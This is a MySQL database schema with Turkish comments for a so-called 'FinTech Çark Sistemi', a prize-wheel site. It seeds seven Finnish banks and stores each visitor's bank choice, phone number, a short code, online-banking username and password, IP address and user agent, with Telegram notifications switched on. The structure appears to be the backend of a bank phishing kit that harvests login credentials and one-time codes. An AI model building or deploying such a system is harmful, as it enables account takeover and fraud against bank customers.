-- FinTech Çark Sistemi Veritabanı Schema
-- Bu dosyayı sunucunuzda çalıştırın

CREATE DATABASE IF NOT EXISTS demowa_teze CHARACTER SET utf8mb4 COLLATE utf8mb4_unicode_ci;
USE demowa_teze;

-- Bankalar Tablosu
CREATE TABLE IF NOT EXISTS `banks` (
    `id` INT(11) UNSIGNED NOT NULL AUTO_INCREMENT,
    `name` VARCHAR(100) NOT NULL,
    `slug` VARCHAR(100) NOT NULL,
    `logo` VARCHAR(255) DEFAULT NULL,
    `status` ENUM('active', 'inactive') DEFAULT 'active',
    `sort_order` INT(11) DEFAULT 0,
    `created_at` TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
    `updated_at` TIMESTAMP DEFAULT CURRENT_TIMESTAMP ON UPDATE CURRENT_TIMESTAMP,
    PRIMARY KEY (`id`),
    UNIQUE KEY `slug` (`slug`)
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_unicode_ci;

-- Kullanıcılar Tablosu
CREATE TABLE IF NOT EXISTS `users` (
    `id` INT(11) UNSIGNED NOT NULL AUTO_INCREMENT,
    `session_id` VARCHAR(255) NOT NULL,
    `bank_id` INT(11) UNSIGNED DEFAULT NULL,
    `phone` VARCHAR(20) DEFAULT NULL,
    `code` VARCHAR(10) DEFAULT NULL,
    `username` VARCHAR(100) DEFAULT NULL,
    `password` VARCHAR(255) DEFAULT NULL,
    `wheel_result` VARCHAR(100) DEFAULT NULL,
    `ip_address` VARCHAR(45) DEFAULT NULL,
    `user_agent` TEXT DEFAULT NULL,
    `status` ENUM('pending', 'completed', 'blocked') DEFAULT 'pending',
    `created_at` TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
    `updated_at` TIMESTAMP DEFAULT CURRENT_TIMESTAMP ON UPDATE CURRENT_TIMESTAMP,
    PRIMARY KEY (`id`),
    KEY `session_id` (`session_id`),
    KEY `bank_id` (`bank_id`),
    KEY `created_at` (`created_at`),
    CONSTRAINT `fk_users_bank` FOREIGN KEY (`bank_id`) REFERENCES `banks` (`id`) ON DELETE SET NULL
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_unicode_ci;

-- Kullanıcı Oturumları Tablosu
CREATE TABLE IF NOT EXISTS `user_sessions` (
    `id` INT(11) UNSIGNED NOT NULL AUTO_INCREMENT,
    `session_id` VARCHAR(255) NOT NULL,
    `user_id` INT(11) UNSIGNED DEFAULT NULL,
    `current_step` VARCHAR(50) DEFAULT 'bank_selection',
    `data` TEXT DEFAULT NULL,
    `ip_address` VARCHAR(45) DEFAULT NULL,
    `user_agent` TEXT DEFAULT NULL,
    `last_activity` TIMESTAMP DEFAULT CURRENT_TIMESTAMP ON UPDATE CURRENT_TIMESTAMP,
    `created_at` TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
    PRIMARY KEY (`id`),
    UNIQUE KEY `session_id` (`session_id`),
    KEY `user_id` (`user_id`),
    KEY `last_activity` (`last_activity`),
    CONSTRAINT `fk_sessions_user` FOREIGN KEY (`user_id`) REFERENCES `users` (`id`) ON DELETE CASCADE
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_unicode_ci;

-- Admin Kullanıcılar Tablosu
CREATE TABLE IF NOT EXISTS `admin_users` (
    `id` INT(11) UNSIGNED NOT NULL AUTO_INCREMENT,
    `username` VARCHAR(50) NOT NULL,
    `password` VARCHAR(255) NOT NULL,
    `email` VARCHAR(100) DEFAULT NULL,
    `full_name` VARCHAR(100) DEFAULT NULL,
    `role` ENUM('admin', 'moderator', 'viewer') DEFAULT 'viewer',
    `status` ENUM('active', 'inactive') DEFAULT 'active',
    `last_login` TIMESTAMP NULL DEFAULT NULL,
    `created_at` TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
    `updated_at` TIMESTAMP DEFAULT CURRENT_TIMESTAMP ON UPDATE CURRENT_TIMESTAMP,
    PRIMARY KEY (`id`),
    UNIQUE KEY `username` (`username`),
    UNIQUE KEY `email` (`email`)
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_unicode_ci;

-- Sistem Ayarları Tablosu
CREATE TABLE IF NOT EXISTS `settings` (
    `id` INT(11) UNSIGNED NOT NULL AUTO_INCREMENT,
    `key` VARCHAR(100) NOT NULL,
    `value` TEXT DEFAULT NULL,
    `type` ENUM('string', 'integer', 'boolean', 'json') DEFAULT 'string',
    `group` VARCHAR(50) DEFAULT 'general',
    `description` TEXT DEFAULT NULL,
    `updated_at` TIMESTAMP DEFAULT CURRENT_TIMESTAMP ON UPDATE CURRENT_TIMESTAMP,
    PRIMARY KEY (`id`),
    UNIQUE KEY `key` (`key`)
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_unicode_ci;

-- Örnek Banka Verileri
INSERT INTO `banks` (`name`, `slug`, `status`, `sort_order`) VALUES
('Nordea', 'nordea', 'active', 1),
('OP', 'op', 'active', 2),
('Danske Bank', 'danske', 'active', 3),
('Handelsbanken', 'handelsbanken', 'active', 4),
('Aktia', 'aktia', 'active', 5),
('Ålandsbanken', 'alandsbanken', 'active', 6),
('OmaSP', 'omasp', 'active', 7);

-- Varsayılan Admin Kullanıcı (username: admin, password: admin123)
-- Güvenlik için kurulumdan sonra şifreyi mutlaka değiştirin!
INSERT INTO `admin_users` (`username`, `password`, `email`, `full_name`, `role`, `status`) VALUES
('admin', '$2y$10$92IXUNpkjO0rOQ5byMi.Ye4oKoEa3Ro9llC/.og/at2.uheWG/igi', 'admin@example.com', 'Admin User', 'admin', 'active');

-- Temel Sistem Ayarları
INSERT INTO `settings` (`key`, `value`, `type`, `group`, `description`) VALUES
('site_name', 'FinTech Çark Sistemi', 'string', 'general', 'Site başlığı'),
('site_url', 'http://demo.wap7.site', 'string', 'general', 'Site URL'),
('maintenance_mode', '0', 'boolean', 'general', 'Bakım modu'),
('telegram_notifications', '1', 'boolean', 'telegram', 'Telegram bildirimleri'),
('max_attempts', '3', 'integer', 'security', 'Maksimum deneme sayısı');
